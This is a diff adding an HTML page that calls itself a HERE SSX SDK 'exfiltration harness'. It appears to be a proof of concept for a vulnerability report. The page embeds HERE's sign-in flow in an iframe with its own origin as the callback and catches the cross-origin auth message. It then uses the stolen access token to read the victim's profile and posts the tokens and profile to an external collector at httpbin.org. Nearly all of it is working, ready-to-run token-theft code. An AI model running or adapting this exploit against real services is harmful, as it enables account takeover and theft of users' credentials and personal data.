@@ -1,0 +1,369 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>HERE SSX SDK Exfiltration Harness</title>
+  <style>
+    :root {
+      --bg: #07111d;
+      --panel: #0f1c2a;
+      --ink: #eaf1ff;
+      --muted: #93a8c6;
+      --line: #21354b;
+      --accent: #79f0a8;
+      --danger: #ff9d9d;
+      --code: #081018;
+    }
+
+    body {
+      margin: 0;
+      font: 16px/1.5 monospace;
+      background:
+        radial-gradient(circle at top right, rgba(121, 240, 168, 0.10), transparent 24%),
+        radial-gradient(circle at top left, rgba(102, 177, 255, 0.10), transparent 26%),
+        var(--bg);
+      color: var(--ink);
+    }
+
+    header, main {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 16px;
+    }
+
+    header {
+      padding-top: 22px;
+    }
+
+    h1, h2 {
+      margin: 0 0 10px;
+      font-weight: 700;
+    }
+
+    p {
+      margin: 0 0 10px;
+    }
+
+    button {
+      padding: 10px 14px;
+      font: inherit;
+      cursor: pointer;
+      margin-right: 10px;
+      border: 1px solid var(--line);
+      border-radius: 10px;
+      color: var(--ink);
+      background: linear-gradient(180deg, #15263a, #0f1c2a);
+    }
+
+    #status {
+      margin: 12px 0;
+      color: var(--accent);
+      word-break: break-all;
+    }
+
+    .lede {
+      color: var(--muted);
+      max-width: 980px;
+    }
+
+    .meta {
+      margin-bottom: 16px;
+      color: var(--muted);
+    }
+
+    .meta code {
+      color: var(--ink);
+    }
+
+    #frame-wrap {
+      border-top: 1px solid var(--line);
+      padding-top: 16px;
+    }
+
+    iframe {
+      width: 100%;
+      min-height: 760px;
+      border: 1px solid var(--line);
+      border-radius: 14px;
+      background: #fff;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 16px;
+      margin-top: 16px;
+    }
+
+    .panel {
+      background: linear-gradient(180deg, rgba(255, 255, 255, 0.02), rgba(255, 255, 255, 0.01));
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      padding: 16px;
+      box-shadow: 0 18px 40px rgba(0, 0, 0, 0.24);
+    }
+
+    pre {
+      white-space: pre-wrap;
+      word-break: break-word;
+      background: var(--code);
+      border: 1px solid var(--line);
+      color: var(--ink);
+      border-radius: 12px;
+      padding: 12px;
+      min-height: 220px;
+      margin: 0;
+    }
+
+    @media (max-width: 900px) {
+      .grid {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>HERE SSX SDK Exfiltration Harness</h1>
+    <p class="lede">
+      This attacker page frames <code>account.here.com/ssx-ec</code> with its own origin as the SDK
+      callback <code>uri</code>. When HERE posts a sign-in completion payload cross-origin, the page
+      steals the full auth object, reads the victim profile from <code>account.api.here.com/user/me</code>,
+      and forwards the combined capture to <code>httpbin</code>.
+    </p>
+    <p id="status">Idle.</p>
+    <p class="meta">Collector URL: <code id="collector-url"></code></p>
+    <button id="load-frame" type="button">Load Framed Flow</button>
+    <button id="clear-log" type="button">Clear Log</button>
+  </header>
+  <main>
+    <div class="panel">
+      <h2>Framed Flow</h2>
+      <div id="frame-wrap"></div>
+    </div>
+    <div class="grid">
+      <div class="panel">
+        <h2>Message Log</h2>
+        <pre id="log"></pre>
+      </div>
+      <div class="panel">
+        <h2>Collector Echo</h2>
+        <pre id="httpbin"></pre>
+      </div>
+    </div>
+  </main>
+  <script>
+    const logEl = document.getElementById("log");
+    const httpbinEl = document.getElementById("httpbin");
+    const statusEl = document.getElementById("status");
+    const frameWrap = document.getElementById("frame-wrap");
+    const collectorUrlEl = document.getElementById("collector-url");
+    const clientId = "YQijV3hAPdxySAVtE6ZT";
+    const base = "https://account.here.com/ssx-ec";
+    const collectorUrl = "https://httpbin.org/anything/here-ssx-ec-sdk-exfil";
+    const state = {
+      frameUrl: "",
+      lastSensitiveKey: "",
+      lastSensitiveCapture: null,
+      lastCollectorResponse: null,
+      lastProfileFetch: null
+    };
+
+    function stringify(value) {
+      try {
+        return typeof value === "string" ? value : JSON.stringify(value, null, 2);
+      } catch (error) {
+        return String(value);
+      }
+    }
+
+    function setStatus(message, isError = false) {
+      statusEl.textContent = message;
+      statusEl.style.color = isError ? "var(--danger)" : "var(--accent)";
+    }
+
+    function appendLog(label, value) {
+      const stamp = new Date().toISOString();
+      const line = `[${stamp}] ${label}\n${stringify(value)}\n\n`;
+      logEl.textContent += line;
+    }
+
+    function buildUrl() {
+      const params = new URLSearchParams({
+        channel: "selfServe",
+        currentWindow: "true",
+        nonce: String(Date.now()),
+        sdk: "true",
+        "self-certify-age": "true",
+        "sign-in-template": "clm",
+        type: "frame",
+        uri: window.location.origin,
+        version: "4",
+        correlationId: crypto.randomUUID(),
+        language: "en-US",
+        "client-id": clientId,
+        clientData: "{}"
+      });
+      return `${base}?${params.toString()}`;
+    }
+
+    function loadFrame() {
+      frameWrap.textContent = "";
+      const iframe = document.createElement("iframe");
+      const url = buildUrl();
+      iframe.src = url;
+      frameWrap.appendChild(iframe);
+      state.frameUrl = url;
+      setStatus(`Loaded iframe with uri=${window.location.origin}`);
+      appendLog("iframe_src", url);
+    }
+
+    function safeParseJson(text) {
+      try {
+        return JSON.parse(text);
+      } catch (error) {
+        return null;
+      }
+    }
+
+    function extractAuthPayload(rawData) {
+      const envelope = typeof rawData === "string" ? safeParseJson(rawData) || rawData : rawData;
+      if (!envelope || typeof envelope !== "object") {
+        return null;
+      }
+      const auth = envelope.data && typeof envelope.data === "object" ? envelope.data : envelope;
+      if (!auth || typeof auth !== "object") {
+        return null;
+      }
+      if (!auth.accessToken && !auth.refreshToken && !auth.profileUrl && !auth.userId) {
+        return null;
+      }
+      return { envelope, auth };
+    }
+
+    async function fetchProfile(auth) {
+      if (!auth || !auth.accessToken || !auth.profileUrl) {
+        return {
+          ok: false,
+          skipped: true,
+          reason: "Missing accessToken or profileUrl"
+        };
+      }
+      const response = await fetch(auth.profileUrl, {
+        method: "GET",
+        headers: {
+          Authorization: `Bearer ${auth.accessToken}`
+        }
+      });
+      const text = await response.text();
+      const json = safeParseJson(text);
+      return {
+        ok: response.ok,
+        status: response.status,
+        url: auth.profileUrl,
+        headers: Object.fromEntries(response.headers.entries()),
+        text,
+        json
+      };
+    }
+
+    async function postToCollector(body) {
+      const response = await fetch(collectorUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(body)
+      });
+      const text = await response.text();
+      const json = safeParseJson(text);
+      return {
+        ok: response.ok,
+        status: response.status,
+        url: collectorUrl,
+        headers: Object.fromEntries(response.headers.entries()),
+        text,
+        json
+      };
+    }
+
+    async function handleSensitiveMessage(event) {
+      const extracted = extractAuthPayload(event.data);
+      if (!extracted) {
+        return;
+      }
+
+      const key = [
+        extracted.auth.userId || "",
+        extracted.auth.accessToken || "",
+        extracted.auth.refreshToken || ""
+      ].join("|");
+      if (key && key === state.lastSensitiveKey) {
+        return;
+      }
+      state.lastSensitiveKey = key;
+
+      setStatus("Captured HERE auth payload. Reading victim profile and posting to httpbin.");
+      const profileFetch = await fetchProfile(extracted.auth);
+      state.lastProfileFetch = profileFetch;
+
+      const sensitiveCapture = {
+        capturedAt: new Date().toISOString(),
+        attackerOrigin: window.location.origin,
+        frameUrl: state.frameUrl,
+        messageOrigin: event.origin,
+        sdkMessage: extracted.envelope,
+        stolenAuthObject: extracted.auth,
+        profileFetch
+      };
+      state.lastSensitiveCapture = sensitiveCapture;
+      window.lastSensitiveCapture = sensitiveCapture;
+      window.lastProfileFetch = profileFetch;
+
+      appendLog("sensitive_capture", sensitiveCapture);
+
+      const collectorResponse = await postToCollector(sensitiveCapture);
+      state.lastCollectorResponse = collectorResponse;
+      window.lastCollectorResponse = collectorResponse;
+      httpbinEl.textContent = stringify(collectorResponse.json || collectorResponse);
+      appendLog("httpbin_response", collectorResponse.json || collectorResponse);
+      setStatus(`Collector write completed with HTTP ${collectorResponse.status} to ${collectorUrl}.`, !collectorResponse.ok);
+    }
+
+    window.addEventListener("message", (event) => {
+      appendLog("message", {
+        origin: event.origin,
+        data: event.data
+      });
+      if (event.origin === "https://account.here.com") {
+        handleSensitiveMessage(event).catch((error) => {
+          setStatus(`Collector chain failed: ${String(error)}`, true);
+          appendLog("collector_error", {
+            message: String(error),
+            stack: error && error.stack
+          });
+        });
+      }
+    });
+
+    document.getElementById("load-frame").addEventListener("click", loadFrame);
+    document.getElementById("clear-log").addEventListener("click", () => {
+      logEl.textContent = "";
+      httpbinEl.textContent = "";
+      state.lastSensitiveKey = "";
+      state.lastSensitiveCapture = null;
+      state.lastCollectorResponse = null;
+      state.lastProfileFetch = null;
+      window.lastSensitiveCapture = null;
+      window.lastCollectorResponse = null;
+      window.lastProfileFetch = null;
+    });
+
+    collectorUrlEl.textContent = collectorUrl;
+    appendLog("page_origin", window.location.origin);
+    appendLog("collector_url", collectorUrl);
+    loadFrame();
+  </script>
+</body>
+</html>
